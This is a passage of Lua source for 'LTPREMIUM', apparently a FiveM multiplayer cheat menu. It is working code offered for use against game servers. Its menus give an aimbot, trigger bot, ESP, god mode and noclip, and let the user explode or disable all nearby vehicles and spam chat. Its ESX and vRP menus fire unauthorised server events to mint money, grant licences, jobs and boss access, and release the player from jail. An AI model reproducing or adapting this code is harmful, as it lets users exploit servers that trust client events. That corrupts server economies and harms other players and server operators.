                LTPREMIUM.Display()
            elseif LTPREMIUM.IsMenuOpened("VehBoostMenu") then
                if LTPREMIUM.Button('Engine Power boost ~r~RESET') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1.0)
			elseif LTPREMIUM.Button('Engine Power boost ~g~x2') then
					SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2.0 * 20.0)
			elseif LTPREMIUM.Button('Engine Power boost  ~g~x4') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4.0 * 20.0)
			elseif LTPREMIUM.Button('Engine Power boost  ~g~x8') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8.0 * 20.0)
			elseif LTPREMIUM.Button('Engine Power boost  ~g~x16') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16.0 * 20.0)
			elseif LTPREMIUM.Button('Engine Power boost  ~g~x32') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 32.0 * 20.0)
			elseif LTPREMIUM.Button('Engine Power boost  ~g~x64') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 64.0 * 20.0)
			elseif LTPREMIUM.Button('Engine Power boost  ~g~x128') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 128.0 * 20.0)
			elseif LTPREMIUM.Button('Engine Power boost  ~g~x512') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 512.0 * 20.0)
			elseif LTPREMIUM.Button('Engine Power boost  ~g~ULTIMATE') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5012.0 * 20.0)
			end

                LTPREMIUM.Display()
            elseif LTPREMIUM.IsMenuOpened("MaliciousMenu") then
                if LTPREMIUM.CheckBox(
                    "Crosshair",
                    crosshair,
                    function(enabled)
                        crosshair = enabled
                    end)
                then
                elseif LTPREMIUM.CheckBox(
                    "Crosshair 2",
                    crosshair2,
                    function(enabled)
                         crosshair2 = enabled
                    end)
                then
                elseif LTPREMIUM.CheckBox(
                    "Crosshair 3",
                    crosshair3,
                    function(enabled)
                        crosshair3 = enabled
                    end)
                then
                elseif LTPREMIUM.CheckBox(
                "~o~Thermal Vision",
                thermalVision,
                function(enabled)
                    thermalVision = enabled
                    SetSeethrough(thermalVision)
                end)
                then
				elseif LTPREMIUM.CheckBox(
                "~p~Night Vision",
                nightVision,
                function(enabled)
                    nightVision = enabled
                    SetNightvision(nightVision)
                end)
                then
				elseif LTPREMIUM.CheckBox(
				    "Christmas Weather",
					XMAS,
					function(enabled)
					XMAS = enabled
					end)
					then
				elseif LTPREMIUM.CheckBox(
				    "Foggy Weather",
					FOGGY,
					function(enabled)
					FOGGY = enabled
					end)
					then
				elseif LTPREMIUM.CheckBox(
				    "Clear Weather",
					CLEAR,
					function(enabled)
					CLEAR = enabled
					end)
					then
				elseif LTPREMIUM.CheckBox(
				    "Blizzard Weather",
					BLIZZARD,
					function(enabled)
					BLIZZARD = enabled
					end)
					then
				elseif LTPREMIUM.CheckBox(
				    "Extra Sunny Weather",
					EXTRASUNNY,
					function(enabled)
					EXTRASUNNY = enabled
					end)
					then
				elseif LTPREMIUM.Button("Time set to night") then
				NetworkOverrideClockTime(23, 50, 0)
				elseif LTPREMIUM.Button("Time set to day") then
				NetworkOverrideClockTime(12, 12, 0)
				elseif LTPREMIUM.Button("Wall-in Legion Square") then
                    x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))
                    roundx = tonumber(string.format('%.2f', x))
                    roundy = tonumber(string.format('%.2f', y))
                    roundz = tonumber(string.format('%.2f', z))
                    local e8 = -145066854
                    RequestModel(e8)
                    while not HasModelLoaded(e8) do
                        Citizen.Wait(-1000)
                    end
                    local e9 = CreateObject(e8, 258.91, -933.1, 26.21, true, true, false)
                    local ea = CreateObject(e8, 200.91, -874.1, 26.21, true, true, false)
					local e92 = CreateObject(e8, 126.52, -933.2, 26.21, true, true, false)
					local ea2 = CreateObject(e8, 184.52, -991.2, 26.21, true, true, false)
                    SetEntityHeading(e9, 158.41)
                    SetEntityHeading(ea, 90.51)
					SetEntityHeading(e92, 332.41)
                    SetEntityHeading(ea2, 260.51)
                    FreezeEntityPosition(e9, true)
                    FreezeEntityPosition(ea, true)
					FreezeEntityPosition(e92, true)
                    FreezeEntityPosition(ea2, true)
                elseif LTPREMIUM.CheckBox(
                    "AimBot",
                    LOJ38,
                    function(enabled)
                        LOJ38 = enabled
                    end)
                then
                elseif LTPREMIUM.MenuButton('~r~→  ~s~ESP Menu', 'LulxDJ') then
				elseif LTPREMIUM.CheckBox(
				"~g~EMP ~s~All Nearby Vehicles",
				destroyvehicles,
				function(enabled)
				destroyvehicles = enabled
				end) 
			then
				elseif LTPREMIUM.CheckBox(
				"~r~Explode ~s~All Nearby Vehicles",
				explodevehicles,
				function(enabled)
				explodevehicles = enabled
				end) 
			then
                elseif LTPREMIUM.CheckBox(
                    "Trigger Bot",
                    TriggerBot,
                    function(enabled)
                        TriggerBot = enabled
                    end)
                then
				 elseif
                    LTPREMIUM.CheckBox(
                        'Chat Spam',
                        chatspam,
                        function(enabled)
                            chatspam = enabled
                        end
                    )
                 then

                end

                LTPREMIUM.Display()
			elseif LTPREMIUM.IsMenuOpened('LulxDJ') then
                if
                    LTPREMIUM.CheckBox(
                        '~h~~r~ESP ~s~MasterSwitch',
                        esp,
                        function(enabled)
                            esp = enabled
                        end
                    )
                 then
                elseif
                    LTPREMIUM.CheckBox(
                        '~h~~r~ESP ~s~Box',
                        jfjfjffuhguh,
                        function(enabled)
                            jfjfjffuhguh = enabled
                        end
                    )
                 then
                elseif
                    LTPREMIUM.CheckBox(
                        '~h~~r~ESP ~s~Info',
                        KDOWJDw,
                        function(enabled)
                            KDOWJDw = enabled
                        end
                    )
                 then
                elseif
                    LTPREMIUM.CheckBox(
                        '~h~~r~ESP ~s~Lines',
                        jfjfjf,
                        function(enabled)
                            jfjfjf = enabled
                        end
                    )
                 then
                end
                LTPREMIUM.Display()
            elseif LTPREMIUM.IsMenuOpened("ESXMenu") then
                if LTPREMIUM.MenuButton("~r~→  ~s~ESX Money Options", "ESXMoneyMenu") then
                elseif LTPREMIUM.MenuButton("~r~→  ~s~ESX Job Menu", "ESXJobMenu") then
                elseif LTPREMIUM.MenuButton("~r~→  ~s~ESX Boss", "ESXBossMenu") then
                elseif LTPREMIUM.MenuButton("~r~→  ~s~ESX Drugs", "ESXDrugMenu") then
                elseif LTPREMIUM.MenuButton("~r~→  ~s~ESX Misc", "ESXMiscMenu") then
                end

                LTPREMIUM.Display()
            elseif LTPREMIUM.IsMenuOpened("ESXMiscMenu") then
                if LTPREMIUM.Button("ESX Harvest FixKit") then
                    TriggerServerEvent("esx_mechanicjob:startHarvest")
				elseif LTPREMIUM.Button    ("ESX Get all licenses ") then
					TriggerServerEvent("dmv:success")
					TriggerServerEvent('esx_weashopjob:addLicense', 'tazer')
					TriggerServerEvent('esx_weashopjob:addLicense', 'ppa')
					TriggerServerEvent('esx_weashopjob:addLicense', 'ppa2')
					TriggerServerEvent('esx_weashopjob:addLicense', 'drive_bike')
					TriggerServerEvent('esx_weashopjob:addLicense', 'drive_truck')
					TriggerServerEvent('esx_dmvschool:addLicense', 'dmv')
					TriggerServerEvent('esx_dmvschool:addLicense', 'drive')
					TriggerServerEvent('esx_dmvschool:addLicense', 'drive_bike')
					TriggerServerEvent('esx_dmvschool:addLicense', 'drive_truck')
					TriggerServerEvent('esx_airlines:addLicense', 'helico')
					TriggerServerEvent('esx_airlines:addLicense', 'avion')
                elseif LTPREMIUM.Button("ESX Craft FixKit") then
                    TriggerServerEvent("esx_mechanicjob:startCraft")
                end

                LTPREMIUM.Display()
            elseif LTPREMIUM.IsMenuOpened("ESXDrugMenu") then
                if LTPREMIUM.Button("Harvest Weed (x5)") then
                    TriggerServerEvent("esx_drugs:startHarvestWeed")
                    TriggerServerEvent("esx_drugs:startHarvestWeed")
                    TriggerServerEvent("esx_drugs:startHarvestWeed")
                    TriggerServerEvent("esx_drugs:startHarvestWeed")
                    TriggerServerEvent("esx_drugs:startHarvestWeed")
                elseif LTPREMIUM.Button("Transform Weed (x5)") then
                    TriggerServerEvent("esx_drugs:startTransformWeed")
                    TriggerServerEvent("esx_drugs:startTransformWeed")
                    TriggerServerEvent("esx_drugs:startTransformWeed")
                    TriggerServerEvent("esx_drugs:startTransformWeed")
                    TriggerServerEvent("esx_drugs:startTransformWeed")
                elseif LTPREMIUM.Button("Sell Weed (x5)") then
                    TriggerServerEvent("esx_drugs:startSellWeed")
                    TriggerServerEvent("esx_drugs:startSellWeed")
                    TriggerServerEvent("esx_drugs:startSellWeed")
                    TriggerServerEvent("esx_drugs:startSellWeed")
                    TriggerServerEvent("esx_drugs:startSellWeed")
                elseif LTPREMIUM.Button("Harvest Coke (x5)") then
                    TriggerServerEvent("esx_drugs:startHarvestCoke")
                    TriggerServerEvent("esx_drugs:startHarvestCoke")
                    TriggerServerEvent("esx_drugs:startHarvestCoke")
                    TriggerServerEvent("esx_drugs:startHarvestCoke")
                    TriggerServerEvent("esx_drugs:startHarvestCoke")
                elseif LTPREMIUM.Button("Transform Coke (x5)") then
                    TriggerServerEvent("esx_drugs:startTransformCoke")
                    TriggerServerEvent("esx_drugs:startTransformCoke")
                    TriggerServerEvent("esx_drugs:startTransformCoke")
                    TriggerServerEvent("esx_drugs:startTransformCoke")
                    TriggerServerEvent("esx_drugs:startTransformCoke")
                elseif LTPREMIUM.Button("Sell Coke (x5)") then
                    TriggerServerEvent("esx_drugs:startSellCoke")
                    TriggerServerEvent("esx_drugs:startSellCoke")
                    TriggerServerEvent("esx_drugs:startSellCoke")
                    TriggerServerEvent("esx_drugs:startSellCoke")
                    TriggerServerEvent("esx_drugs:startSellCoke")
                elseif LTPREMIUM.Button("Harvest Meth (x5)") then
                    TriggerServerEvent("esx_drugs:startHarvestMeth")
                    TriggerServerEvent("esx_drugs:startHarvestMeth")
                    TriggerServerEvent("esx_drugs:startHarvestMeth")
                    TriggerServerEvent("esx_drugs:startHarvestMeth")
                    TriggerServerEvent("esx_drugs:startHarvestMeth")
                elseif LTPREMIUM.Button("Transform Meth (x5)") then
                    TriggerServerEvent("esx_drugs:startTransformMeth")
                    TriggerServerEvent("esx_drugs:startTransformMeth")
                    TriggerServerEvent("esx_drugs:startTransformMeth")
                    TriggerServerEvent("esx_drugs:startTransformMeth")
                    TriggerServerEvent("esx_drugs:startTransformMeth")
                elseif LTPREMIUM.Button("Sell Meth (x5)") then
                    TriggerServerEvent("esx_drugs:startSellMeth")
                    TriggerServerEvent("esx_drugs:startSellMeth")
                    TriggerServerEvent("esx_drugs:startSellMeth")
                    TriggerServerEvent("esx_drugs:startSellMeth")
                    TriggerServerEvent("esx_drugs:startSellMeth")
                elseif LTPREMIUM.Button("Harvest Opium (x5)") then
                    TriggerServerEvent("esx_drugs:startHarvestOpium")
                    TriggerServerEvent("esx_drugs:startHarvestOpium")
                    TriggerServerEvent("esx_drugs:startHarvestOpium")
                    TriggerServerEvent("esx_drugs:startHarvestOpium")
                    TriggerServerEvent("esx_drugs:startHarvestOpium")
                elseif LTPREMIUM.Button("Transform Opium (x5)") then
                    TriggerServerEvent("esx_drugs:startTransformOpium")
                    TriggerServerEvent("esx_drugs:startTransformOpium")
                    TriggerServerEvent("esx_drugs:startTransformOpium")
                    TriggerServerEvent("esx_drugs:startTransformOpium")
                    TriggerServerEvent("esx_drugs:startTransformOpium")
                elseif LTPREMIUM.Button("Sell Opium (x5)") then
                    TriggerServerEvent("esx_drugs:startSellOpium")
                    TriggerServerEvent("esx_drugs:startSellOpium")
                    TriggerServerEvent("esx_drugs:startSellOpium")
                    TriggerServerEvent ("esx_drugs:startSellOpium")
                    TriggerServerEvent("esx_drugs:startSellOpium")
                elseif LTPREMIUM.Button("Money Wash (x10)") then
                    TriggerServerEvent("esx_blanchisseur:startWhitening", 1)
                    TriggerServerEvent("esx_blanchisseur:startWhitening", 1)
                    TriggerServerEvent("esx_blanchisseur:startWhitening", 1)
                    TriggerServerEvent("esx_blanchisseur:startWhitening", 1)
                    TriggerServerEvent("esx_blanchisseur:startWhitening", 1)
                    TriggerServerEvent("esx_blanchisseur:startWhitening", 1)
                    TriggerServerEvent("esx_blanchisseur:startWhitening", 1)
                    TriggerServerEvent("esx_blanchisseur:startWhitening", 1)
                    TriggerServerEvent("esx_blanchisseur:startWhitening", 1)
                    TriggerServerEvent("esx_blanchisseur:startWhitening", 1)
                elseif LTPREMIUM.Button("Stop all (Drugs)") then
                    TriggerServerEvent("esx_drugs:stopHarvestCoke")
                    TriggerServerEvent("esx_drugs:stopTransformCoke")
                    TriggerServerEvent("esx_drugs:stopSellCoke")
                    TriggerServerEvent("esx_drugs:stopHarvestMeth")
                    TriggerServerEvent("esx_drugs:stopTransformMeth")
                    TriggerServerEvent("esx_drugs:stopSellMeth")
                    TriggerServerEvent("esx_drugs:stopHarvestWeed")
                    TriggerServerEvent("esx_drugs:stopTransformWeed")
                    TriggerServerEvent("esx_drugs:stopSellWeed")
                    TriggerServerEvent("esx_drugs:stopHarvestOpium")
                    TriggerServerEvent("esx_drugs:stopTransformOpium")
                    TriggerServerEvent("esx_drugs:stopSellOpium")
                end


                LTPREMIUM.Display()
-- 4x482
            elseif LTPREMIUM.IsMenuOpened("ESXBossMenu") then
                if LTPREMIUM.Button("~c~Mechanic~w~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'mecano', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif LTPREMIUM.Button("~b~Police~w~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'police', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif LTPREMIUM.Button("~r~Ambulance~w~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'ambulance', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif LTPREMIUM.Button("~y~Taxi~w~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'taxi', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif LTPREMIUM.Button("~g~Real Estate~w~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'realestateagent', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif LTPREMIUM.Button("~p~Gang~w~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'gang', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif LTPREMIUM.Button("~o~Car Dealer~w~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'cardealer', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif LTPREMIUM.Button("~y~Banker~w~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'banker', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif LTPREMIUM.Button("~c~Mafia~w~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'mafia', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif LTPREMIUM.Button("~g~ESX ~y~Custom Boss Menu") then
					local result = KeyboardInput("Enter Boss Menu Script Name", "", 10)
					if result then
						TriggerEvent('esx_society:openBossMenu', result, function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
					end
				end

                LTPREMIUM.Display()
            elseif LTPREMIUM.IsMenuOpened("ESXJobMenu") then
                if LTPREMIUM.Button("Unemployed") then
                    TriggerServerEvent("NB:destituerplayer",GetPlayerServerId(-1))
                elseif LTPREMIUM.Button("Police") then
                    TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(-1),"police",3)
                elseif LTPREMIUM.Button("Mechanic") then
                    TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(-1),"mecano",3)
                elseif LTPREMIUM.Button("Taxi") then
                    TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(-1),"taxi",3)
                elseif LTPREMIUM.Button("Ambulance") then
                    TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(-1),"ambulance",3)
                elseif LTPREMIUM.Button("Real Estate Agent") then
                    TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(-1),"realestateagent",3)
                elseif LTPREMIUM.Button("Car Dealer") then
                    TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(-1),"cardealer",3)
                end

                LTPREMIUM.Display()
                        elseif LTPREMIUM.IsMenuOpened("ESXMoneyMenu") then
                if LTPREMIUM.Button("-» Ultimate moneymaker «-") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent('esx_truckerjob:pay', result)
				TriggerServerEvent('vrp_slotmachine:server:2', result)
				TriggerServerEvent("esx_pizza:pay", result)
				TriggerServerEvent('esx_jobs:caution', 'give_back', result)
				TriggerServerEvent('lscustoms:payGarage', result)
				TriggerServerEvent('esx_tankerjob:pay', result)
				TriggerServerEvent('esx_vehicletrunk:giveDirty', result)
				TriggerServerEvent('f0ba1292-b68d-4d95-8823-6230cdf282b6', result)
				TriggerServerEvent('gambling:spend', result)
				TriggerServerEvent('265df2d8-421b-4727-b01d-b92fd6503f5e', result)
				TriggerServerEvent('AdminMenu:giveDirtyMoney', result)
				TriggerServerEvent('AdminMenu:giveBank', result)
				TriggerServerEvent('AdminMenu:giveCash', result)
				TriggerServerEvent('esx_slotmachine:sv:2', result)
				TriggerServerEvent('esx_truckerjob:pay', result)
				TriggerServerEvent('esx_moneywash:deposit', result)
				TriggerServerEvent('esx_moneywash:withdraw', result)
				TriggerServerEvent('esx_moneywash:deposit', result)
			    TriggerServerEvent('mission:completed', result)
				TriggerServerEvent('truckerJob:success',result)-- 4x482
				TriggerServerEvent('c65a46c5-5485-4404-bacf-06a106900258', result)
				TriggerServerEvent('99kr-burglary:addMoney', result)
				end
			elseif LTPREMIUM.Button("~g~Caution give back $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent("esx_jobs:caution", "give_back", result)
				end
			elseif LTPREMIUM.Button("~g~Truckerjob $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent('esx_truckerjob:pay', result)
				end
			elseif LTPREMIUM.Button("~g~Admin give bank $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent('AdminMenu:giveBank', result)
				end
			elseif LTPREMIUM.Button("~g~Admin give cash $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent('AdminMenu:giveCash', result)
				end
			elseif LTPREMIUM.Button("~g~Postal job $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent("esx_gopostaljob:pay", result)
				end
			elseif LTPREMIUM.Button("~g~Bank security $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent("esx_banksecurity:pay", result)
				end
			elseif LTPREMIUM.Button("~g~Slotmachine $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent("esx_slotmachine:sv:2", result)
				end
			elseif LTPREMIUM.Button("~g~ LScustoms $") then
				local result = KeyboardInput("Enter amount of money", "", 100)
				if result then
					TriggerServerEvent("lscustoms:payGarage", {costs = -result})
				end		
			elseif LTPREMIUM.Button("~g~Slotmachine(2) $") then
				local result = KeyboardInput("Enter amount of money", "", 100)
				if result then
				TriggerServerEvent("vrp_slotmachine:server:2", result)
				end
			elseif LTPREMIUM.Button("~g~Dirty money $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent('AdminMenu:giveDirtyMoney', result)
				end
			elseif LTPREMIUM.Button("~g~Delivery $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent('delivery:success', result)
				end
			elseif LTPREMIUM.Button("~g~Taxijob $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent ('taxi:success', result)
				end
			elseif LTPREMIUM.Button("~g~Taxijob 10.000x $") then
				a=1 repeat TriggerServerEvent('esx_taxijob:success') a=a+1 until (a>10000)
			elseif LTPREMIUM.Button("~g~Pilot & Taxi (~g~ESX~s~) $") then
					TriggerServerEvent('esx_pilot:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_pilot:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_pilot:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_pilot:success')
			elseif LTPREMIUM.Button("~g~Garbagejob $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent("esx_garbagejob:pay", result)
				end	
			elseif LTPREMIUM.Button("~g~Paycheck $") then
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				end

                LTPREMIUM.Display()
            elseif LTPREMIUM.IsMenuOpened("SelfMenu") then
			if LTPREMIUM.MenuButton("~r~→  ~s~Ped Menu", "PedMenu") then
                                elseif LTPREMIUM.Button("~g~Heal ~s~Yourself") then
                    SetEntityHealth(PlayerPedId(), 200)
                elseif LTPREMIUM.Button("Get Some ~b~Armor") then
                    SetPedArmour(PlayerPedId(), 200)
				elseif LTPREMIUM.Button("Go Invisible") then
				local model2 = GetHashKey("mp_m_niko_01")
				local player2 = PlayerId()
				local playerPed = GetPlayerPed(-1)
				 RequestModel(model2)
     while not HasModelLoaded(model2) do
        Wait(100)
    end

    SetPlayerModel(player2, model2)
    SetModelAsNoLongerNeeded(model2)
					elseif LTPREMIUM.Button("Go Visible Again") then
				local model3 = GetHashKey("mp_m_freemode_01")
				local player3 = PlayerId()
				local playerPed = GetPlayerPed(-1)
				 RequestModel(model3)
     while not HasModelLoaded(model3) do
        Wait(100)
    end

    SetPlayerModel(player3, model3)
		SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(model3)
                elseif LTPREMIUM.Button("~o~Food~s~ & ~b~Water ~s~100% (~g~ESX~s~)") then
                    TriggerEvent("esx_status:set", "hunger", 1000000)
                    TriggerEvent("esx_status:set", "thirst", 1000000)
				elseif LTPREMIUM.Button("Get Some $ ~g~(~g~ESX~s~)") then
				TriggerServerEvent("esx_godirtyjob:pay", 500000)
				TriggerServerEvent("esx_pizza:pay", 500000)
				TriggerServerEvent("esx_slotmachine:sv:2", 500000)
				TriggerServerEvent("esx_banksecurity:pay", 500000)
				TriggerServerEvent('AdminMenu:giveDirtyMoney', 500000)
				TriggerServerEvent('AdminMenu:giveBank', 500000)        
				TriggerServerEvent("AdminMenu:giveCash", 500000)
				TriggerServerEvent("esx_gopostaljob:pay", 500000)
				TriggerServerEvent("AdminMenu:giveBank", 500000)
				TriggerServerEvent("esx_truckerjob:pay", 500000)
				TriggerServerEvent("esx_carthief:pay", 500000)
			    TriggerServerEvent("esx_garbagejob:pay", 500000)
				TriggerServerEvent("esx_ranger:pay", 500000)
				TriggerServerEvent("esx_truckersjob:payy", 500000)
				PlaySoundFrontend(-1, "ROBBERY_MONEY_TOTAL", "HUD_FRONTEND_CUSTOM_SOUNDSET", true)
				drawNotification("~g~KA-CHING $$")
				elseif LTPREMIUM.Button("Get some $ ~b~(VRP)") then
				TriggerServerEvent("dropOff", 100000)
			    TriggerServerEvent("dropOff", 100000)
				TriggerServerEvent("dropOff", 100000)
			    TriggerServerEvent("dropOff", 100000)
				TriggerServerEvent("dropOff", 100000)
			    TriggerServerEvent("dropOff", 100000)
				TriggerServerEvent("dropOff", 100000)
			    TriggerServerEvent("dropOff", 100000)
				TriggerServerEvent("dropOff", 100000)
			    TriggerServerEvent("dropOff", 100000)
				TriggerServerEvent("dropOff", 100000)
			    TriggerServerEvent("dropOff", 100000)
				TriggerServerEvent("dropOff", 100000)
			    TriggerServerEvent("dropOff", 100000)
				TriggerServerEvent("dropOff", 100000)
			    TriggerServerEvent("dropOff", 100000)
				TriggerServerEvent("dropOff", 100000)
			    TriggerServerEvent("dropOff", 100000)
				TriggerServerEvent("dropOff", 100000)
			    TriggerServerEvent("dropOff", 100000)
				TriggerServerEvent("dropOff", 100000)
			    TriggerServerEvent("dropOff", 100000)
				TriggerServerEvent("dropOff", 100000)
			    TriggerServerEvent("dropOff", 100000)
				TriggerServerEvent("dropOff", 100000)
			    TriggerServerEvent("dropOff", 100000)
				TriggerServerEvent("dropOff", 100000)
			    TriggerServerEvent("dropOff", 100000)
				TriggerServerEvent('PayForRepairNow',-100000)
				TriggerServerEvent('PayForRepairNow',-100000)
				TriggerServerEvent('PayForRepairNow',-100000)
				TriggerServerEvent('PayForRepairNow',-100000)
				TriggerServerEvent('PayForRepairNow',-100000)
				TriggerServerEvent('PayForRepairNow',-100000)
				TriggerServerEvent('PayForRepairNow',-100000)
				TriggerServerEvent('PayForRepairNow',-100000)
				TriggerServerEvent('PayForRepairNow',-100000)
				TriggerServerEvent('PayForRepairNow',-100000)
				TriggerServerEvent('PayForRepairNow',-100000)
				TriggerServerEvent('PayForRepairNow',-100000)
				drawNotification("~g~KA-CHING $$")
                elseif LTPREMIUM.Button("Revive yourself (~g~ESX~s~)") then
                    TriggerEvent("esx_ambulancejob:revive")
					TriggerEvent("ambulancier:selfRespawn")
				elseif LTPREMIUM.Button("Open Jail Menu (~g~ESX~s~)") then
					TriggerEvent("esx-qalle-jail:openJailMenu")
                elseif LTPREMIUM.Button("Get Out Of Jail (~g~ESX~s~)") then
                    local ped = PlayerPedId(-1)
                    TriggerServerEvent("esx-qalle-jail:jailPlayer",GetPlayerServerId(ped),0,"escaperino")
                    TriggerServerEvent("esx_jailer:sendToJail",GetPlayerServerId(ped),0)
                    TriggerServerEvent("esx_jail:sendToJail",GetPlayerServerId(ped),0)
					TriggerServerEvent("esx_jailer:unjailTime", -1)
					TriggerServerEvent("JailUpdate", 0)
					TriggerEvent("UnJP")
                    TriggerServerEvent("js:jailuser",GetPlayerServerId(ped),0,"escaperino")
                elseif LTPREMIUM.Button("~r~Kys") then
                    SetEntityHealth(PlayerPedId(), 0)
                elseif  LTPREMIUM.CheckBox(
                    "God-Mode",
                    godmode,
                    function(enabled)
                    godmode = enabled
                    end)
                then
				elseif LTPREMIUM.CheckBox(
                    "~o~Nuke ~s~Punches",
                    explosiveAmmo,
                    function(enabled)
                        explosiveAmmo = enabled
                    end)
                then
                elseif LTPREMIUM.CheckBox(
                    "Never Get Tired",
                    infStamina,
                    function(enabled)
                    infStamina = enabled
                    end)
                then
                elseif LTPREMIUM.CheckBox(
                    "Fast Run",
                    fastrun,
                    function(enabled)
                        fastrun = enabled
                    end)
                then
                elseif LTPREMIUM.CheckBox(
                    "Super Jump",
                    SuperJump,
                    function(enabled)
                        SuperJump = enabled
                    end)
                then
                elseif LTPREMIUM.CheckBox(
                    "Noclip",
                    Noclip,
                    function(enabled)
                        Noclip = enabled
                    end)
                then
                end

                LTPREMIUM.Display()
			elseif LTPREMIUM.IsMenuOpened("PedMenu") then
				if LTPREMIUM.ComboBox("MalePed", peds2, currentPedd, selectedPedd, function(currentIndex, selectedIndex)
                    currentPedd = currentIndex
                    selectedPedd = selectedIndex
                end)
                then
				elseif LTPREMIUM.ComboBox("FemalePed", peds3, currentPeddd, selectedPeddd, function(currentIndex, selectedIndex)
                    currentPeddd = currentIndex
                    selectedPeddd = selectedIndex
                end)
                then
				elseif LTPREMIUM.ComboBox("AnimalPed", peds4, currentPedddd, selectedPedddd, function(currentIndex, selectedIndex)
                    currentPedddd = currentIndex
                    selectedPedddd = selectedIndex
                end)
                then
			elseif LTPREMIUM.Button("Change To Selected ~b~Male") then
					Deer.Destroy()
		Wait(100)
				local model1 = GetHashKey(peds2[selectedPedd])
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1)
				
    RequestModel(model1)
    while not HasModelLoaded(model1) do
        Wait(100)
    end

    SetPlayerModel(player1, model1)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(model1)
	elseif LTPREMIUM.Button("Change To Selected ~p~Female") then
		Deer.Destroy()
		Wait(100)
				local model5 = GetHashKey(peds3[selectedPeddd])
				local player5 = PlayerId()
                local playerPed = GetPlayerPed(-1)
				
    RequestModel(model5)
    while not HasModelLoaded(model5) do
        Wait(100)
    end

    SetPlayerModel(player5, model5)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(model5)
	elseif LTPREMIUM.Button("Change To Selected ~y~Animal") then
			Deer.Destroy()
		Wait(100)
				local model6 = GetHashKey(peds4[selectedPedddd])
				local player6 = PlayerId()
                local playerPed = GetPlayerPed(-1)
				
    RequestModel(model6)
    while not HasModelLoaded(model6) do
        Wait(100)
    end

    SetPlayerModel(player6, model6)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(model6)
		elseif LTPREMIUM.Button("Spawn A ~y~Deer ~s~And Ride It") then
     Deer.Create()
	Citizen.Wait(150)
	 Deer.Ride()
				elseif LTPREMIUM.Button("Change To FiveM Ped") then
						Deer.Destroy()
		Wait(100)
				local model3 = GetHashKey("mp_m_freemode_01")
				local player3 = PlayerId()
				local playerPed = GetPlayerPed(-1)
